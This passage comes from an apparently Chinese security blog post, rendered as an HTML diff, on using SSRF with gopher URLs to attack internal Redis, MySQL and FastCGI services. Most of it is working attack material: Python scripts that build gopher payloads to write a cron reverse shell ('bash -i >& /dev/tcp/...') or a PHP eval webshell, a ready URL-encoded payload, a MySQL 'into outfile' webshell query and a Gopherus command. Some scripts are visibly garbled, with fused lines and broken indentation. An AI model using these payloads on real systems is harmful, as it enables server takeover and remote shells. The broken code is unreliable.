+<li>PostgreSQL(Port-5432)</li>
+<li>FastCGI (Port-9000)</li>
+<li>Memcached (Port-11211)</li>
+<li>Redis (Port-6379)</li>
+<li>Zabbix (Port-10050)</li>
+<li>SMTP (Port-25)</li>
+</ol>
+<p><img loading="lazy" src="C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666629843369.png" alt="1666629843369" srcset="C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666629843369.png?size=small, C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666629843369.png?size=medium 1.5x, C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666629843369.png?size=large 2x" data-title="1666629843369" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>使用说明：</p>
+<p><a href="https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/"target="_blank" rel="external nofollow noopener noreferrer">https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/</a></p>
+<h6 id="redis" class="heading-element"><span>0.0.0.3.1  redis</span>
+  <a href="#redis" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>#######  理论</p>
+<p>首先要知道redis是个啥，起什么作用</p>
+<p>看宝塔里面的redis安装说明，貌似这个就是一种数据库，那么ssrf打redis和mysql应该是有类似的效果</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281011914.png" alt="1666189235250" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281011914.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281011914.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281011914.png?size=large 2x" data-title="1666189235250" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>redis常见漏洞利用https://www.freebuf.com/articles/network/280984.html</p>
+<p>在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等…..</p>
+<p>#######  攻击</p>
+<ul>
+<li>
+<p>写进定时任务</p>
+<pre tabindex="0"><code>主要依靠如下redis命令
+flushallset 1 &#39;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/反弹IP/反弹端口 0&gt;&amp;1\n\n&#39;config set dir /var/spool/cron/config set dbfilename rootsave </code></pre><p>脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">urllib.parse</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">protocol</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;gopher://&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ip</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;192.168.0.129&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">port</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;6379&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">reverse_ip</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;192.168.0.132&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">reverse_port</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;2333&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">cron</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\n\n\n\n</span><span style="color:#a6be9d">*/1 * * * * bash -i &gt;&amp; /dev/tcp/</span><span style="color:#a6be9d">%s</span><span style="color:#a6be9d">/</span><span style="color:#a6be9d">%s</span><span style="color:#a6be9d"> 0&gt;&amp;1</span><span style="color:#a6be9d">\n\n\n\n</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">%</span>(<span style="color:#58a1dd">reverse_ip</span>,<span style="color:#58a1dd">reverse_port</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">filename</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;root&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">path</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;/var/spool/cron&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">passwd</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">=</span>[<span style="color:#a6be9d">&#34;flushall&#34;</span>,     <span style="color:#a6be9d">&#34;set 1 </span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">cron</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">replace</span>(<span style="color:#a6be9d">&#34; &#34;</span>,<span style="color:#a6be9d">&#34;$</span><span style="color:#a6be9d">{IFS}</span><span style="color:#a6be9d">&#34;</span>)),     <span style="color:#a6be9d">&#34;config set dir </span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">path</span>),     <span style="color:#a6be9d">&#34;config set dbfilename </span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">filename</span>),     <span style="color:#a6be9d">&#34;save&#34;</span>     ]
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">passwd</span>:    
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">cmd</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">insert</span>(<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">&#34;AUTH </span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">passwd</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">payload</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">protocol</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">ip</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">&#34;:&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">port</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">&#34;/_&#34;</span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">redis_format</span>(<span style="color:#58a1dd">arr</span>):    
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">CRLF</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\r\n</span><span style="color:#a6be9d">&#34;</span>    
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">redis_arr</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">arr</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">split</span>(<span style="color:#a6be9d">&#34; &#34;</span>)    
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">cmd</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;&#34;</span>    
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">cmd</span><span style="color:#ff636f">+=</span><span style="color:#a6be9d">&#34;*&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">str</span>(<span style="color:#58a1dd">len</span>(<span style="color:#58a1dd">redis_arr</span>))    
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">for</span> <span style="color:#58a1dd">x</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">redis_arr</span>:        
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">cmd</span><span style="color:#ff636f">+=</span><span style="color:#58a1dd">CRLF</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">&#34;$&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">str</span>(<span style="color:#58a1dd">len</span>((<span style="color:#58a1dd">x</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">replace</span>(<span style="color:#a6be9d">&#34;$</span><span style="color:#a6be9d">{IFS}</span><span style="color:#a6be9d">&#34;</span>,<span style="color:#a6be9d">&#34; &#34;</span>))))<span style="color:#ff636f">+</span><span style="color:#58a1dd">CRLF</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">x</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">replace</span>(<span style="color:#a6be9d">&#34;$</span><span style="color:#a6be9d">{IFS}</span><span style="color:#a6be9d">&#34;</span>,<span style="color:#a6be9d">&#34; &#34;</span>)    
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">cmd</span><span style="color:#ff636f">+=</span><span style="color:#58a1dd">CRLF</span>    
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">return</span> <span style="color:#58a1dd">cmdif</span> <span style="color:#58a1dd">__name__</span><span style="color:#ff636f">==</span><span style="color:#a6be9d">&#34;__main__&#34;</span>:    
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">for</span> <span style="color:#58a1dd">x</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">cmd</span>:        
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">payload</span> <span style="color:#ff636f">+=</span> <span style="color:#58a1dd">urllib</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">parse</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">quote</span>(<span style="color:#58a1dd">redis_format</span>(<span style="color:#58a1dd">x</span>))    
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">payload</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">urllib</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">parse</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">quote</span>(<span style="color:#58a1dd">payload</span>)    
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">with</span> <span style="color:#58a1dd">open</span>(<span style="color:#a6be9d">&#39;Result.txt&#39;</span>,<span style="color:#a6be9d">&#39;w&#39;</span>) <span style="color:#ff636f">as</span> <span style="color:#58a1dd">f</span>:        
+</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">f</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">write</span>(<span style="color:#58a1dd">payload</span>)    
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff636f">with</span> <span style="color:#58a1dd">open</span>(<span style="color:#a6be9d">&#34;Result.txt&#34;</span>,<span style="color:#a6be9d">&#34;r&#34;</span>) <span style="color:#ff636f">as</span> <span style="color:#58a1dd">f</span>:        
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff636f">for</span> <span style="color:#58a1dd">line</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">f</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">readlines</span>():            
+</span></span><span style="display:flex;"><span>                            <span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">line</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">strip</span>())</span></span></code></pre></div></li>
+<li>
+<p>写webshell</p>
+<p>在内网中的redis不会开web服务的吧..</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">urllib</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">protocol</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;gopher://&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ip</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">port</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;6379&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">shell</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\n\n</span><span style="color:#a6be9d">&lt;?php eval($_POST[</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">whoami</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">]);?&gt;</span><span style="color:#a6be9d">\n\n</span><span style="color:#a6be9d">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">filename</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;shell.php&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">path</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;/var/www/html&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">passwd</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">=</span>[<span style="color:#a6be9d">&#34;flushall&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#34;set 1 </span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">shell</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">replace</span>(<span style="color:#a6be9d">&#34; &#34;</span>,<span style="color:#a6be9d">&#34;$</span><span style="color:#a6be9d">{IFS}</span><span style="color:#a6be9d">&#34;</span>)),
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#34;config set dir </span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">path</span>),
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#34;config set dbfilename </span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">filename</span>),
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#34;save&#34;</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">passwd</span>:
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">insert</span>(<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">&#34;AUTH </span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">passwd</span>))
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">payload</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">protocol</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">ip</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">&#34;:&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">port</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">&#34;/_&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">redis_format</span>(<span style="color:#58a1dd">arr</span>):
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">CRLF</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\r\n</span><span style="color:#a6be9d">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">redis_arr</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">arr</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">split</span>(<span style="color:#a6be9d">&#34; &#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">+=</span><span style="color:#a6be9d">&#34;*&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">str</span>(<span style="color:#58a1dd">len</span>(<span style="color:#58a1dd">redis_arr</span>))
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">for</span> <span style="color:#58a1dd">x</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">redis_arr</span>:
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">+=</span><span style="color:#58a1dd">CRLF</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">&#34;$&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">str</span>(<span style="color:#58a1dd">len</span>((<span style="color:#58a1dd">x</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">replace</span>(<span style="color:#a6be9d">&#34;$</span><span style="color:#a6be9d">{IFS}</span><span style="color:#a6be9d">&#34;</span>,<span style="color:#a6be9d">&#34; &#34;</span>))))<span style="color:#ff636f">+</span><span style="color:#58a1dd">CRLF</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">x</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">replace</span>(<span style="color:#a6be9d">&#34;$</span><span style="color:#a6be9d">{IFS}</span><span style="color:#a6be9d">&#34;</span>,<span style="color:#a6be9d">&#34; &#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">+=</span><span style="color:#58a1dd">CRLF</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span> <span style="color:#58a1dd">cmd</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">__name__</span><span style="color:#ff636f">==</span><span style="color:#a6be9d">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">for</span> <span style="color:#58a1dd">x</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">cmd</span>:
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">payload</span> <span style="color:#ff636f">+=</span> <span style="color:#58a1dd">urllib</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">quote</span>(<span style="color:#58a1dd">redis_format</span>(<span style="color:#58a1dd">x</span>))
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span> <span style="color:#58a1dd">urllib</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">quote</span>(<span style="color:#58a1dd">payload</span>)    <span style="color:#828b96;font-style:italic"># 由于我们这里是GET，所以要进行两次url编</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">码</span></span></span></code></pre></div></li>
+</ul>
+<p>命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">flushall</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> <span style="color:#a6be9d">1</span> <span style="color:#a6be9d">&#39;&lt;?php eval($_POST[&#34;whoami&#34;]);?&gt;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">config</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">dir</span> <span style="color:#ff636f">/</span><span style="color:#ff636f">var</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">html</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">config</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">dbfilename</span> <span style="color:#58a1dd">shell</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">save</span></span></span></code></pre></div><p>payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">gopher</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">3</span><span style="color:#58a1dd">A</span><span style="color:#828b96;font-style:italic">//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
+</span></span></span></code></pre></div><h6 id="mysql" class="heading-element"><span>0.0.0.3.2  mysql</span>
+  <a href="#mysql" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>#######  攻击实现原理</p>
+<p>我觉得首先学习mysql写shell</p>
+<p><a href="https://www.cnblogs.com/zztac/p/11371149.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/zztac/p/11371149.html</a></p>
+<p><a href="https://paper.seebug.org/510/"target="_blank" rel="external nofollow noopener noreferrer">https://paper.seebug.org/510/</a></p>
+<p>比较常用的，其实也没啥神秘的，不过是把查询到的数据进行一个导出，我们在查的东西里面写一下一句话木马，这个木马就会出现在我们查询的数据表里，如果能导出为php文件就万事大吉了</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#a6be9d">&#39;&lt;?php @eval($_POST[&#34;shell&#34;]);?&gt;&#39;</span> <span style="color:#ff636f">into</span> <span style="color:#58a1dd">outfile</span> <span style="color:#a6be9d">&#34;/var/www/html/shell.php&#34;</span></span></span></code></pre></div><p>还有一个需要关注的点就是：outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径。这个问题在php注入中更加麻烦，因为会自动将单引号转义成&rsquo;,那么基本就GG了，但是load_file，后面的路径可以是单引号、0x、char转换的字符，但是路径中的斜杠是/而不是\</p>
+<p>大概了解了一下，客户端连接mysql有两种，一种是有密码，一种是无密码， 所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，这里利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。</p>
+<p>进行mysql查询的时候同样有数据包交互，我们要做的就是伪造这种数据包交互，进行curl，当然，这种我们伪造的数据包是利用gopher协议进行发送的</p>
+<p>curl gopher://127.0.0.1/_XXXXXX   大概像这样</p>
+<h6 id="fast-cgi" class="heading-element"><span>0.0.0.3.3  FAST-CGI</span>
+  <a href="#fast-cgi" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>#######  理论</p>
+<p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p>
+<p>nginx本身不能处理PHP，它只是个web服务器，当接收到请求后，如果是php请求，则发给php解释器处理，并把结果返回给客户端。</p>
+<p>nginx一般是把请求发fastcgi管理进程处理，fascgi管理进程选择cgi子进程处理结果并返回被nginx</p>
+<p>php-fpm:https://zhuanlan.zhihu.com/p/99271704</p>
+<p>nginx和php-fpm的交互：https://learnku.com/articles/41710</p>
+<p><em><strong>简而言之，nginx知识一个服务器，php相关的活还得转交给背后的php干，而fastcgi就是这个“通讯兵”，而且是遵从某种转接规则的通讯兵，而php-fpm就是管理这些“通讯兵”的长官。</strong></em></p>
+<p>#######  攻击实现原理</p>
+<p>那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？</p>
+<p>理论上当然是不可以的，即使我们能控制<code>SCRIPT_FILENAME</code>，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</p>
+<p>但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，<code>auto_prepend_file</code>和<code>auto_append_file</code>。</p>
+<p><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件；<code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</p>
+<p>那么就有趣了，假设我们设置<code>auto_prepend_file</code>为<code>php://input</code>，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项<code>allow_url_include</code>）</p>
+<p>使用工具 <a href="https://github.com/tarunkant/Gopherus"target="_blank" rel="external nofollow noopener noreferrer">Gopherus</a> 生成攻击FastCGI协议的payload</p>
+<pre tabindex="0"><code>python gopherus.py --exploit fastcgi
+/var/www/html/index.php                 # 这里输入的是一个已知存在的php文件
+echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php</code></pre><p>现成的payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">gopher</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">3</span><span style="color:#58a1dd">A</span><span 